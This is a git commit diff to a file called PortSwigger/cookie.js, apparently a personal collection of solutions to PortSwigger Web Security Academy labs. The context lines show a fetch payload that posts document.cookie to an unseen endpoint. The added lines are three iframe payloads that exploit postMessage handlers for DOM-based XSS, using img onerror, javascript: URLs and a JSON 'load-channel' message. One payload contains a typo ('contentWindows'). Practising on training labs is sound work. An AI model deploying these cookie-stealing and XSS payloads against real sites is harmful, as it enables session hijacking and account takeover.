4bc3118deb08da65f7ee4e2b066cb54b5f9baeee
kluo <15222944+kluo84@users.noreply.github.com>
2020-06-20 18:03:50 -0500

    Update cookie.js
    iframe

--- PortSwigger/cookie.js
+++ PortSwigger/cookie.js
@@ -5,3 +5,7 @@ mode: 'no-cors',
 body:document.cookie
 });
 </script> 
+
+        <iframe src="https://ac471f661e4948a38068c46600aa009e.web-security-academy.net/" onload = "this.contentWindows.postMessage ('<img src=1 onerror=alert(document.cookie)>','*')"></iframe>
+        <iframe src="https://accd1f191f8ba4c880e2387f00340052.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')"> 
+        <iframe src=https://ac3d1f0b1eda919180e78849007f009a.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(document.cookie)\"}","*")'> 
